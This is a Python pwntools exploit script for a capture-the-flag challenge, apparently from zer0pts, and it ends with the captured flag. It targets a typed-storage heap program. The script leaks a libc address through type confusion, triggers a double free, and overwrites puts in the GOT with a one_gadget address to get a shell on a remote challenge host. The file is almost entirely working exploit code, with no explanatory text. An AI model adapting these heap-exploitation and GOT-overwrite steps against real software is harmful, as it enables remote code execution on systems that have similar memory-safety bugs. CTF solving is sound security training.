import os

from enum import Enum

from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


binpath = './chall'
elf = ELF(binpath)
libc = ELF('./libc.so.6')
context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
gdbscript = '''
gef
# main
b *0x000000000400F69
# after menu
b *0x000000000400F84
start
c
'''
# io = gdb.debug([binpath], env={"LD_LIBRARY_PATH": os.getcwd()}, aslr=False, gdbscript=gdbscript)
io = remote('13.231.207.73', 9007)
# io = process(binpath, env={"LD_LIBRARY_PATH": os.getcwd()})


size = 0


class Type(Enum):
    LONG = 1
    DOUBLE = 2
    STR = 3


@debug
def add(type_, data):
    global size
    io.sendlineafter(b'> ', b'1')
    if type_ == Type.LONG:
        io.sendlineafter(b'): ', b'1')
        io.sendlineafter(b'Data: ', b'%d' % data)
    elif type_ == Type.DOUBLE:
        io.sendlineafter(b'): ', b'2')
        io.sendlineafter(b'Data: ', b'%f' % data)
    elif type_ == Type.STR:
        io.sendlineafter(b'): ', b'3')
        io.sendlineafter(b'Data: ', data)
    size += 1


@debug
def get(type_, index):
    io.sendlineafter(b'> ', b'2')
    if type_ == Type.LONG:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'1')
        io.recvuntil(b'Data: ')
        return int(io.recvline())
    elif type_ == Type.DOUBLE:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'2')
        io.recvuntil(b'Data: ')
        return float(io.recvline())
    elif type_ == Type.STR:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'3')
        io.recvuntil(b'Data: ')
        return io.recvline()

    raise Exception("unknown type")


@debug
def edit(type_, index, data):
    io.sendlineafter(b'> ', b'3')
    if type_ == Type.LONG:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'1')
        io.sendlineafter(b'Data: ', b'%d' % data)
    elif type_ == Type.DOUBLE:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'2')
        io.sendlineafter(b'Data: ', b'%f' % data)
    elif type_ == Type.STR:
        io.sendlineafter(b'Index: ', b'%d' % index)
        io.sendlineafter(b'): ', b'3')
        io.sendlineafter(b'Data: ', data)


@debug
def delete(index):
    global size
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.recvuntil(b'Successfully removed')
    size -= 1


@debug
def read(addr):
    add(Type.LONG, addr)
    ret = get(Type.STR, size - 1).rstrip()
    delete(size - 1)
    return ret


addr_printf = u64(read(elf.got['printf']).ljust(8, b'\x00'))
addr_libc = addr_printf - libc.symbols['printf']
# addr_puts = u64(read(elf.got['puts']).ljust(8, b'\x00'))
print("addr_printf = 0x{:x}".format(addr_printf))
# print("addr_puts = 0x{:x}".format(addr_puts))

print("addr_libc = 0x{:x}".format(addr_libc))


add(Type.STR, b'A' * 8)
addr_chunk = get(Type.LONG, 0)
delete(0)
print("Add pointer to already deleted chunk (0x{:x}) as LONG".format(addr_chunk))
add(Type.LONG, addr_chunk)
print("Double free")
delete(0)

add(Type.STR, p64(elf.got['puts']))
add(Type.STR, b'B' * 8)

gadget_offsets = [324293, 324386, 1090444]
add(Type.STR, p64(addr_libc + gadget_offsets[2]))

io.interactive()


# zer0pts{m4y_th3_typ3_b3_w1th_y0u}
